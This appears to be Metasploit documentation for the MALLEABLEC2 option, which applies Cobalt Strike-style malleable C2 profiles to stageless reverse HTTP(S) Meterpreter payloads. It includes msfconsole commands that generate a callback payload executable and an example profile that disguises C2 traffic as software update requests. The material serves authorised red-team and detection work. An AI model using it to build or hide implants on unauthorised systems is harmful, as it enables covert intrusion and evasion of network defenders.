Metasploit's stageless HTTP(S) Meterpreter payloads support a `MALLEABLEC2` datastore option that points at a malleable C2 profile file. A malleable C2 profile is a small text-based configuration format popularized by Cobalt Strike (see the [Cobalt Strike Malleable C2 documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm) for the full language) that describes the shape of C2 traffic: what URIs are requested, what headers are sent, how the session/connection ID is carried, and how request/response bodies are encoded or wrapped.

Metasploit's parser understands the *syntax* of the full Cobalt Strike profile format, but it only *acts on* a subset of the directives that syntax can express. This page documents how to use `MALLEABLEC2`, and -- importantly -- spells out exactly which directives change Metasploit's wire behavior versus which ones are parsed (so a real-world profile loads without error) but silently have no effect.

This feature was released in Metasploit 6.5.

## Supported payloads

`MALLEABLEC2` is registered only on the **stageless** (`Single`) reverse HTTP/HTTPS Meterpreter payloads, for example:

* `windows/meterpreter_reverse_http` / `windows/meterpreter_reverse_https`
* `windows/x64/meterpreter_reverse_http` / `windows/x64/meterpreter_reverse_https`
* `linux/x64/meterpreter_reverse_http`, and the other `linux/<arch>/meterpreter_reverse_http[s]` mettle payloads (aarch64, etc.)
* `php/meterpreter_reverse_http` / `php/meterpreter_reverse_https`
* `python/meterpreter_reverse_http` / `python/meterpreter_reverse_https`
* `java/meterpreter_reverse_http` / `java/meterpreter_reverse_https`

The code that parses a malleable C2 profile and shapes traffic around it lives in Meterpreter itself, not in the stager assembly that performs the initial callback and downloads Meterpreter. Stagers are deliberately kept as small as possible for compatibility across the constrained environments they have to run in, so they can't carry the parsing/TLV logic a profile requires -- only a stageless payload, which embeds Meterpreter directly, can.

## Basic usage

`MALLEABLEC2` takes a **path to a profile file on the system running Metasploit** -- the file is read and parsed locally when the handler starts and when the payload is generated; the datastore value itself is just the path, not the profile contents.

```msf
msf6 > use payload/windows/meterpreter_reverse_http
msf6 payload(windows/meterpreter_reverse_http) > set LHOST 10.0.0.5
msf6 payload(windows/meterpreter_reverse_http) > set MALLEABLEC2 /path/to/profile.profile
msf6 payload(windows/meterpreter_reverse_http) > generate -f exe -o payload.exe
```

The same option can be set on a handler (`exploit/multi/handler`) or on an exploit that uses a matching reverse HTTP(S) payload. Both the handler and the generated payload need to agree on the same profile -- the handler uses it to shape the listener (registered URIs, response headers/encoding) and the payload uses it to shape its own requests.

## Profile syntax primer

A profile is a sequence of `set key "value";` statements and `name { ... }` blocks, with `#` line comments and C-style string escapes (`\r`, `\n`, `\t`, `\"`, `\\`, `\xNN`):

```
# Comment
set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)";

http-get {
    set uri "/jquery-3.3.1.min.js";

    client {
        header "Accept" "text/javascript, application/javascript";

        metadata {
            parameter "callback";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
    }
}
```

Blocks can nest, and unrecognized blocks/directives (see below) are parsed without error so that real Cobalt Strike profiles -- which contain many sections Metasploit doesn't implement -- load successfully.

## Directives honored by Metasploit

These are the directives that actually change what Metasploit sends or expects on the wire:

| Location | Directive | Effect |
|---|---|---|
| top level | `set useragent "value";` | Default `User-Agent` sent by the payload for all requests. |
| top level | `set uri "value [value2 ...]";` | Default URI. May list several space-separated candidates; one is registered per candidate (the client is expected to send requests to any of them). |
| `http-get { }` | `set uri "value";` | Overrides the base URI for GET requests only. |
| `http-post { }` | `set uri "value";` | Overrides the base URI for POST requests only. |
| `http-get`/`http-post` -> `client { }` | `set useragent "value";` | Overrides the `User-Agent` for that specific verb only. |
| `http-get`/`http-post` -> `client { }` | `header "Name" "Value";` | An HTTP header the payload adds to its outgoing GET/POST request. Repeatable. |
| `http-get` -> `client { }` | `parameter "name";` (inside `metadata { }`) | Carries the session/connection ID as a GET query-string parameter named `name`, instead of the default trailing path segment. |
| `http-get` -> `client { }` | `header "name";` (inside `metadata { }`, single arg) | Carries the session/connection ID in a request header named `name`, instead of the default trailing path segment. |
| `http-post` -> `client { }` | `parameter "name";` / `header "name";` (inside `id { }`) | Same ID placement behavior as above, for POST requests. |
| `metadata { }` / `id { }` | `prepend "value";` / `append "value";` | Wraps the encoded connection ID with a literal prefix/suffix before it's placed in the URI, query parameter, or header. |
| `metadata { }` / `id { }` | `base64;` / `base64url;` | Encodes the connection ID before placement (and the handler decodes it back on receipt). |
| `http-post` -> `client { }` -> `output { }` | `base64;` / `base64url;` | Encodes the POST request body the payload sends; the handler reverses this via `unwrap_inbound_post`. |
| `http-post` -> `client { }` -> `output { }` | `prepend "value";` / `append "value";` | Wraps the POST request body with a literal prefix/suffix; the handler strips it before further decoding. |
| `http-get`/`http-post` -> `server { }` | `header "Name" "Value";` | An HTTP header Metasploit's handler adds to its HTTP response. Repeatable. |
| `http-get` -> `server { }` -> `output { }` | `base64;` / `base64url;` | Encodes the GET response body Metasploit's handler sends back; the payload decodes it on receipt. |
| `http-get` -> `server { }` -> `output { }` | `prepend "value";` / `append "value";` | Wraps the GET response body with a literal prefix/suffix that the payload strips before decoding. |

A working example, combining pieces of both profile fixtures shipped with the parser's spec suite:

```
set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)";

http-get {
    set uri "/updates/check";

    client {
        header "Accept" "application/json";

        metadata {
            parameter "v";
        }
    }

    server {
        header "Content-Type" "application/octet-stream";

        output {
            base64;
            prepend "START_";
            append "_END";
        }
    }
}

http-post {
    set uri "/updates/report";

    client {
        header "Content-Type" "application/octet-stream";

        id {
            parameter "uid";
        }

        output {
            base64;
        }
    }

    server {
        header "Content-Type" "text/plain";
    }
}
```

With this profile: GET polls hit `/updates/check?v=<id>` with an `Accept: application/json` header, and the response body is wrapped as `START_<base64 data>_END`. POSTs go to `/updates/report?uid=<id>` with a `Content-Type: application/octet-stream` header, and the POST body is base64-encoded. Both directions get the specified `server`/`client` headers applied.

## Directives parsed but not honored

Metasploit's lexer recognizes the full set of Cobalt Strike profile keywords so that real-world profiles -- which include sections Metasploit doesn't implement -- parse without error. The following are recognized syntactically but currently have **no effect** on Metasploit's traffic:

**Unimplemented blocks** (parsed for structure, contents discarded):

* `https-certificate` -- SSL certificate pinning/generation is *not* driven by the profile; it's controlled separately via the handler's own SSL datastore options.
* `stage`, `http-stager` -- staging-related blocks (Metasploit's staging is not shaped by the profile).
* `transform-x64`, `transform-x86` -- payload/stager binary transforms.
* Any other unrecognized `name { }` block (e.g. `dns-beacon`, `process-inject`, `post-ex`) -- accepted structurally and otherwise ignored.

**Unimplemented directive keywords** (valid tokens, but never read by `to_tlv`/wrap/unwrap):

`add`, `dns`, `encode_hex`, `hostport`, `mask`, `netbios`, `netbiosu`, `print`, `remove`, `string`, `stringw`, `strrep`, `transform`, `unset`, `uri-append`, `uri-query`, `xor`

Notably, `print;` -- commonly used in real Cobalt Strike profiles inside `output { }` blocks -- is accepted but does nothing in Metasploit.

Additionally, the underlying Meterpreter C2 protocol has a `TLV_TYPE_C2_UUID_COOKIE` value reserved for placing the connection ID in a cookie, but no current profile directive populates it -- only `parameter` and `header` placement (in `metadata { }`/`id { }`) are supported.

If you are interested in any of these options, please open an [issue on GitHub](https://github.com/rapid7/metasploit-framework/issues) requesting that it be added.

## See also

* [`spec/file_fixtures/malleable_c2/minimal_uris_headers.profile`](https://github.com/rapid7/metasploit-framework/blob/master/spec/file_fixtures/malleable_c2/minimal_uris_headers.profile) and [`base64_transforms.profile`](https://github.com/rapid7/metasploit-framework/blob/master/spec/file_fixtures/malleable_c2/base64_transforms.profile) -- additional example profiles used by the test suite.
* [`lib/msf/core/payload/malleable_c2.rb`](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/malleable_c2.rb) -- the parser and TLV-building implementation.
* [Cobalt Strike Malleable C2](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm) -- the full profile language that Metasploit implements a subset of.
